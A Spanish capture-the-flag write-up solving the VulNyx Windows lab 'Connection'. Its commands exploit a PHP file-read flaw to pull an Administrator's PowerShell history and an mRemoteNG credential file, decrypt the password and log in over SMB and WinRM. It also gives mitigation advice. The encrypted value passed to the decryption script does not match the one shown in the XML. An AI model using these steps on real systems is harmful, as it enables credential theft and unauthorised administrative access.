---
title: "VulNyx: Connection"
date: 2026-10-02
draft: false
plataforma: "VulNyx"
tags: ["ctf", "vulnyx", "windows", "lfi", "arbitrary-file-read", "php", "mremoteng", "winrm", "smb", "credential-reuse"]
categories: ["writeups"]
summary: "Resolución de Connection, una máquina Windows de VulNyx: lectura arbitraria de archivos mediante un parámetro vulnerable en PHP, recuperación de una configuración de mRemoteNG, descifrado de una credencial administrativa y acceso remoto por SMB y WinRM."
sistema: ["windows"]
dificultad: "Profesional"
---

*Un recorrido completo de la máquina Connection, centrado en la identificación y explotación de una lectura arbitraria de archivos en una aplicación PHP, el acceso a artefactos del perfil de Administrator, la recuperación de una configuración de mRemoteNG y el descifrado de una contraseña reutilizada para obtener acceso administrativo mediante SMB y WinRM.*

**Publicado el 2 de octubre de 2026 · Por Ne0t3k · 8 minutos de lectura**

Connection es una máquina Windows de dificultad difícil de VulNyx, creada por `d4t4s3c` y diseñada para ejecutarse en VirtualBox. La cadena de compromiso parte de una aplicación web PHP que utiliza el parámetro `section` para cargar contenido. La falta de validación sobre ese valor permite solicitar rutas absolutas del sistema de ficheros Windows y leer archivos locales desde el contexto del servidor web.

La lectura del historial de PowerShell de `Administrator` permite identificar la instalación reciente de mRemoteNG. A partir de ahí, la recuperación de `confCons.xml` expone una contraseña protegida en la configuración de la herramienta. Tras descifrarla, la credencial resulta válida para el usuario `Administrator` mediante SMB y WinRM, proporcionando acceso remoto con privilegios administrativos.

IP objetivo: `10.0.2.8`. IP atacante: `10.0.2.3`. La contraseña recuperada y las flags se muestran parcialmente censuradas para no facilitar la resolución directa de la máquina a terceros.

## Reconocimiento — Descubrimiento de host

El primer paso consiste en identificar los hosts disponibles dentro del segmento de red del laboratorio:

<pre class="term-log">
<span class="cmd">$ nmap -sP 10.0.2.0/24</span>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-02 18:25 +0200
Nmap scan report for 10.0.2.1
Host is up (0.00040s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 10.0.2.2
Host is up (0.00015s latency).
MAC Address: 08:00:27:BB:10:A2 (Oracle VirtualBox virtual NIC)
<span class="hl">Nmap scan report for 10.0.2.8</span>
<span class="hl">Host is up (0.00045s latency).</span>
<span class="hl">MAC Address: 08:00:27:32:90:C2 (Oracle VirtualBox virtual NIC)</span>
Nmap scan report for 10.0.2.3
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 11.33 seconds
</pre>

El barrido ARP localiza cuatro hosts activos:

- `10.0.2.3`: máquina atacante.
- `10.0.2.8`: objetivo de la máquina, con MAC `08:00:27:32:90:C2` asociada a Oracle VirtualBox.

## Reconocimiento — Escaneo de puertos

Con el objetivo localizado, se realiza un escaneo completo de puertos TCP con detección de servicios, versiones y sistema operativo:

<pre class="term-log">
<span class="cmd">$ nmap -sSV -A -p- --open -n 10.0.2.8</span>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-02 18:26 +0200
Nmap scan report for 10.0.2.8
Host is up (0.00060s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
<span class="hl">80/tcp    open  http         Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)</span>
| http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
| http-methods:
|   Potentially risky methods: TRACE
|_http-title: Everest
<span class="hl">135/tcp   open  msrpc        Microsoft Windows RPC</span>
<span class="hl">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span>
<span class="hl">445/tcp   open  microsoft-ds?</span>
<span class="hl">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
<span class="hl">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
49681/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:32:90:C2 (Oracle VirtualBox virtual NIC)
Device type: general purpose
<span class="hl">Running: Microsoft Windows 2019</span>
OS CPE: cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2019
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-10-02T16:27:57
|   start_date: N/A
|_  clock-skew: -1s
|_nbstat: NetBIOS name: CONNECTION, NetBIOS user:, NetBIOS MAC: 08:00:27:32:90:c2 (Oracle VirtualBox virtual NIC)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

TRACEROUTE
HOP RTT      ADDRESS
1   0.60 ms  10.0.2.8
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.52 seconds
</pre>

**Desglose de parámetros:**

- `-sS`: realiza un escaneo TCP SYN semiabierto.
- `-sV`: intenta identificar la versión de cada servicio expuesto.
- `-A`: habilita detección de sistema operativo, scripts NSE por defecto, detección de versiones y traceroute.
- `-p-`: recorre los 65535 puertos TCP.
- `--open`: muestra únicamente los puertos abiertos.
- `-n`: desactiva la resolución DNS inversa para evitar demoras y consultas innecesarias.

El escaneo confirma un objetivo Windows Server 2019 con varios servicios de administración remota expuestos:

- **80/TCP — HTTP:** Apache 2.4.58 sobre Windows con PHP 8.2.12.
- **135/TCP — MSRPC:** endpoint mapper de Windows.
- **139/TCP y 445/TCP — NetBIOS/SMB:** servicios de compartición y administración remota.
- **5985/TCP — WinRM:** Windows Remote Management sobre HTTP.
- **47001/TCP:** servicio HTTPAPI de Windows utilizado habitualmente por componentes de administración remota.
- **Puertos dinámicos RPC:** servicios MSRPC en el rango alto de puertos.

El nombre NetBIOS `CONNECTION` identifica el sistema y el análisis de SMB indica que la firma de mensajes está habilitada pero no es obligatoria. Aunque esta configuración puede ser relevante para otros vectores de ataque, la vía de entrada de esta máquina se encuentra en el servicio HTTP del puerto 80.

## Enumeración web — Parámetro section

Se solicita la raíz de la aplicación web para revisar su código HTML y localizar rutas, parámetros o recursos de interés:

<pre class="term-log">
<span class="cmd">$ curl -sS http://10.0.2.8/</span>
&lt;title&gt;Everest&lt;/title&gt;
&lt;meta content="width=device-width, initial-scale=1.0" name="viewport"&gt;
&lt;meta content="" name="description"&gt;
&lt;meta content="http://webthemez.com" name="author"&gt;
    &lt;!-- css --&gt;
&lt;link href="css/bootstrap.min.css" rel="stylesheet"&gt;
&lt;link href="css/fancybox/jquery.fancybox.css" rel="stylesheet"&gt;
&lt;link href="css/jcarousel.css" rel="stylesheet"&gt;
&lt;link href="css/flexslider.css" rel="stylesheet"&gt;
&lt;link href="js/owl-carousel/owl.carousel.css" rel="stylesheet"&gt;
&lt;link href="css/style.css" rel="stylesheet"&gt;

&lt;header&gt;
    &lt;div class="navbar navbar-default navbar-static-top"&gt;
        &lt;div class="container"&gt;
            &lt;div class="navbar-header"&gt;
                [...]
            &lt;/div&gt;

            &lt;div class="navbar-collapse collapse"&gt;
                &lt;ul class="nav navbar-nav"&gt;
                    &lt;li class="active"&gt;
                        <span class="hl">&lt;a href="page.php?section=index.html"&gt;Home&lt;/a&gt;</span>
                    &lt;/li&gt;

                    &lt;li&gt;
                        <span class="hl">&lt;a href="page.php?section=about.html"&gt;About Us&lt;/a&gt;</span>
                    &lt;/li&gt;

                    &lt;li&gt;
                        <span class="hl">&lt;a href="page.php?section=services.html"&gt;Services&lt;/a&gt;</span>
                    &lt;/li&gt;

                    &lt;li&gt;
                        <span class="hl">&lt;a href="page.php?section=portfolio.html"&gt;Portfolio&lt;/a&gt;</span>
                    &lt;/li&gt;

                    &lt;li&gt;
                        <span class="hl">&lt;a href="page.php?section=pricing.html"&gt;Pricing&lt;/a&gt;</span>
                    &lt;/li&gt;

                    &lt;li&gt;
                        <span class="hl">&lt;a href="page.php?section=contact.html"&gt;Contact&lt;/a&gt;</span>
                    &lt;/li&gt;
                &lt;/ul&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/header&gt;
</pre>

La página utiliza una plantilla denominada *Everest* y sus enlaces delegan el contenido en `page.php` mediante el parámetro GET `section`.

El patrón `page.php?section=<archivo>` es relevante porque el valor del parámetro controla directamente qué recurso se muestra. Antes de asumir una vulnerabilidad, se valida si el endpoint acepta rutas del sistema de ficheros Windows en lugar de limitarse a los documentos esperados por la aplicación.

## Explotación inicial — Lectura arbitraria de archivos

### Fuzzing de rutas Windows

Se utiliza `ffuf` contra el parámetro `section` con una lista de rutas Windows conocidas y se descartan respuestas vacías:

<pre class="term-log">
<span class="cmd">$ ffuf -c -u "http://10.0.2.8/page.php?section=FUZZ" -w win-paths.txt -fs 0</span>

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

:: Method           : GET
:: URL              : http://10.0.2.8/page.php?section=FUZZ
:: Wordlist         : FUZZ: /home/kali/Documentos/WriteUps/Connection/win-paths.txt
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
:: Filter           : Response size: 0

<span class="hl">C:\Windows\System32\drivers\etc\hosts [Status: 200, Size: 824, Words: 172, Lines: 22, Duration: 11ms]</span>
<span class="hl">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt [Status: 200, Size: 199, Words: 7, Lines: 7, Duration: 21ms]</span>
<span class="hl">C:\Users\Administrator\AppData\Roaming\mRemoteNG\confCons.xml [Status: 200, Size: 3382, Words: 131, Lines: 4, Duration: 22ms]</span>
:: Progress: [16/16] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
</pre>

El resultado confirma que el parámetro es vulnerable a **lectura arbitraria de archivos**. La aplicación no restringe `section` a los ficheros HTML legítimos ni valida que la ruta solicitada permanezca dentro del directorio web.

Se recuperan tres archivos de interés:

- `C:\Windows\System32\drivers\etc\hosts`, útil para confirmar la lectura de un fichero de sistema.
- `ConsoleHost_history.txt`, historial de comandos de PowerShell del usuario `Administrator`.
- `confCons.xml`, fichero de configuración de mRemoteNG ubicado en el perfil de `Administrator`.

### Validación con hosts

Se solicita directamente el fichero `hosts` para confirmar que el contenido recibido pertenece al sistema remoto:

<pre class="term-log">
<span class="cmd">$ curl -sX GET "http://10.0.2.8/page.php?section=c:\windows\system32\drivers\etc\hosts"</span>
Copyright (c) 1993-2009 Microsoft Corp.

This is a sample HOSTS file used by Microsoft TCP/IP for Windows.

This file contains the mappings of IP addresses to host names. Each
entry should be kept on an individual line. The IP address should be
placed in the first column followed by the corresponding host name.
The IP address and the host name should be separated by at least one
space.

Additionally, comments (such as these) may be inserted on individual
lines or following the machine name denoted by a '#' symbol.

For example:

102.54.94.97 rhino.acme.com # source server
38.25.63.10 x.acme.com # x client host
localhost name resolution is handled within DNS itself.
127.0.0.1 localhost
::1 localhost
</pre>

La respuesta devuelve el contenido estándar del archivo `hosts` de Windows. Esto verifica que la aplicación puede abrir y servir rutas absolutas del sistema de ficheros local al servidor.

### Historial de PowerShell

El siguiente objetivo es el historial de PowerShell de `Administrator`:

<pre class="term-log">
<span class="cmd">$ curl -s "http://10.0.2.8/page.php?section=C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"</span>
whoami
ipconfig
cd C:\Users\Administrator\Desktop
<span class="hl">msiexec.exe /i ".\mRemoteNG-Installer-1.76.20.24615.msi"</span>
<span class="hl">Remove-Item ".\mRemoteNG-Installer-1.76.20.24615.msi" -Force</span>
Restart-Computer -Force
</pre>

El historial confirma que `Administrator` instaló mRemoteNG mediante el paquete `mRemoteNG-Installer-1.76.20.24615.msi`. mRemoteNG es una herramienta de gestión de conexiones remotas que puede almacenar configuraciones y contraseñas de conexiones en el perfil del usuario.

Este hallazgo justifica priorizar el archivo `C:\Users\Administrator\AppData\Roaming\mRemoteNG\confCons.xml`, identificado durante el fuzzing.

### Configuración de mRemoteNG

<pre class="term-log">
<span class="cmd">$ curl -s "http://10.0.2.8/page.php?section=C:\Users\Administrator\AppData\Roaming\mRemoteNG\confCons.xml"</span>
<span class="hl">&lt;mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="8+5imhIdYe45P+0M7ZrbhQfqU59LAvYx8D0d9foESM8StKPKRijjw4nYCuRohN9jYo4Nwi6btLdfGudBN9vVt3o+" ConfVersion="2.6"&gt;</span>

&lt;/mrng:Connections&gt;
</pre>

El atributo `Protected` contiene un secreto protegido por mRemoteNG. El archivo indica además que la configuración emplea AES en modo GCM y una derivación de clave con 1000 iteraciones.

No se obtiene todavía una credencial directamente: el valor recuperado necesita ser procesado según el formato de protección de mRemoteNG.

## Recuperación de credenciales — mRemoteNG

Para descifrar el valor recuperado se utiliza el proyecto `mremoteng-decrypt`, diseñado para procesar secretos protegidos por mRemoteNG:

<pre class="term-log">
<span class="cmd">$ git clone https://github.com/kmahyyg/mremoteng-decrypt.git &amp;&amp; cd mremoteng-decrypt</span>
Clonando en 'mremoteng-decrypt'...
remote: Enumerating objects: 58, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 58 (delta 3), reused 6 (delta 2), pack-reused 48 (from 1)
Recibiendo objetos: 100% (58/58), 28.04 KiB | 9.35 MiB/s, listo.
Resolviendo deltas: 100% (11/11), listo.
</pre>

Se pasa el valor de `Protected` como argumento del script:

<pre class="term-log">
<span class="cmd">$ python3 mremoteng_decrypt.py -s 'RUQ0nzfeIV11g9eDodO74bdInTIu3LE0OAn3P+tWkNKEoAJWViqGx1us4kMsy4JmmY37UlrxPREoaYlTT+JY4YCnTlogYypQ'</span>
<span class="hl">Password: TheConnect...word123</span>
</pre>

El valor descifrado revela una contraseña en texto claro. Dado que el archivo pertenece al perfil de `Administrator`, la siguiente hipótesis es que el secreto pueda reutilizarse para autenticar al usuario local o de dominio `administrator`.

La contraseña se mantiene parcialmente ofuscada en este write-up.

## Acceso remoto — SMB y WinRM

### Validación por SMB

Se prueba la credencial contra SMB usando NetExec:

<pre class="term-log">
<span class="cmd">$ netexec smb 10.0.2.8 -u 'administrator' -p 'TheConnect...word123'</span>
SMB         10.0.2.8  445  CONNECTION  [*] Windows 10 / Server 2019 Build 17763 x64 (name:CONNECTION) (domain:Connection) (signing:False) (SMBv1:None)
<span class="hl-green">SMB         10.0.2.8  445  CONNECTION  [+] Connection\administrator:TheConnect...word123 (Pwn3d!)</span>
</pre>

La autenticación es válida y NetExec marca la cuenta como `Pwn3d!`, indicando que `Connection\administrator` cuenta con privilegios administrativos sobre el objetivo.

El resultado confirma varios puntos:

- El nombre NetBIOS o dominio local es `Connection`.
- El usuario `administrator` acepta la contraseña descifrada.
- La credencial recuperada de mRemoteNG no era únicamente una contraseña de aplicación o de un servicio externo: se reutiliza como credencial administrativa en la propia máquina.

### Validación y acceso por WinRM

El puerto 5985 estaba expuesto desde la fase de reconocimiento, por lo que se valida la misma credencial contra WinRM:

<pre class="term-log">
<span class="cmd">$ netexec winrm 10.0.2.8 -u 'administrator' -p 'TheConnect...word123'</span>
WINRM       10.0.2.8  5985  CONNECTION  [*] Windows 10 / Server 2019 Build 17763 (name:CONNECTION) (domain:Connection)
<span class="hl-green">WINRM       10.0.2.8  5985  CONNECTION  [+] Connection\administrator:TheConnect...word123 (Pwn3d!)</span>
</pre>

La credencial también es válida mediante WinRM. Esto permite abrir una sesión PowerShell remota como `Administrator` con Evil-WinRM.

## Obtención de flags

Una vez autenticado por WinRM, se revisa el escritorio del usuario `Administrator`:

<pre class="term-log">
Evil-WinRM PS C:\Users\Administrator\Documents&gt; <span class="cmd">dir ../Desktop</span>

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          9/12/2026   1:40 PM             70 root.txt
-a----          9/12/2026   1:39 PM             70 user.txt
</pre>

Las dos flags están ubicadas en el escritorio de `Administrator`, por lo que el acceso administrativo obtenido permite leerlas directamente.

### Flag de usuario

<pre class="term-log">
Evil-WinRM PS C:\Users\Administrator\Documents&gt; <span class="cmd">Get-Content 'C:\Users\Administrator\Desktop\user.txt'</span>
<span class="hl-green">b9119ed1...2d111af1</span>
</pre>

### Flag de root

<pre class="term-log">
Evil-WinRM PS C:\Users\Administrator\Documents&gt; <span class="cmd">Get-Content 'C:\Users\Administrator\Desktop\root.txt'</span>
<span class="hl-green">6b74258c...e6521637f</span>
</pre>

## Conclusión

Connection encadena un fallo de lectura arbitraria de archivos en una aplicación PHP con una exposición insegura de secretos de administración remota. El parámetro `section` de `page.php` acepta rutas absolutas de Windows sin aplicar una lista blanca, normalización de rutas ni comprobación de límites respecto al directorio previsto por la aplicación.

El acceso a `ConsoleHost_history.txt` no proporciona una credencial por sí solo, pero aporta el contexto necesario para identificar mRemoteNG como un objetivo de alto valor. Posteriormente, la lectura de `confCons.xml` permite recuperar un valor protegido que, tras ser descifrado, resulta ser una contraseña válida para `Connection\administrator`.

La severidad de la cadena no depende de una ejecución remota de código inicial: una divulgación de archivos aparentemente limitada se convierte en compromiso completo cuando el servidor web puede acceder a perfiles de usuarios privilegiados y estos contienen configuraciones de herramientas con secretos reutilizados. La exposición de SMB y WinRM completa el impacto, al ofrecer interfaces administrativas directas una vez recuperada la credencial.

## Recomendaciones de mitigación

**Evitar inclusión o lectura controlada por parámetros HTTP:** `page.php` no debe utilizar directamente el contenido de `section` para cargar recursos. La aplicación debe resolver las vistas mediante una lista blanca fija de nombres permitidos, por ejemplo `index`, `about` o `contact`, y asociarlos internamente a rutas predefinidas. Las rutas absolutas, los separadores de directorio y las secuencias de traversal deben rechazarse de forma explícita.

**Aplicar mínimo privilegio al servidor web:** el proceso Apache/PHP no debería disponer de permisos de lectura sobre perfiles sensibles, como `C:\Users\Administrator\AppData\Roaming\`. Separar el usuario de servicio de las cuentas administrativas reduce de forma significativa el impacto de una vulnerabilidad de lectura de archivos.

**Proteger secretos de mRemoteNG:** los archivos de configuración que contienen credenciales o valores protegidos deben almacenarse con ACL restrictivas y nunca ser legibles por cuentas de servicio web. Las contraseñas no deben reutilizarse entre herramientas de administración remota y cuentas locales administrativas.

**Eliminar la reutilización de credenciales administrativas:** la contraseña almacenada en mRemoteNG fue válida para `Connection\administrator`. Las credenciales de cuentas privilegiadas deben ser únicas, rotarse tras una exposición y gestionarse mediante una solución de administración de contraseñas o secretos.

**Restringir WinRM y SMB:** WinRM debe limitarse a redes de administración controladas y a los usuarios que necesiten utilizarlo. SMB debe aplicar firma obligatoria cuando sea posible, restringir cuentas administrativas remotas y reducir al mínimo los servicios expuestos en segmentos no confiables.

**Monitorizar accesos anómalos a perfiles de usuario:** deben registrarse y alertarse los accesos del proceso web a archivos sensibles, especialmente rutas bajo `C:\Users\`, `AppData`, configuraciones de herramientas de acceso remoto y ficheros XML con secretos protegidos.
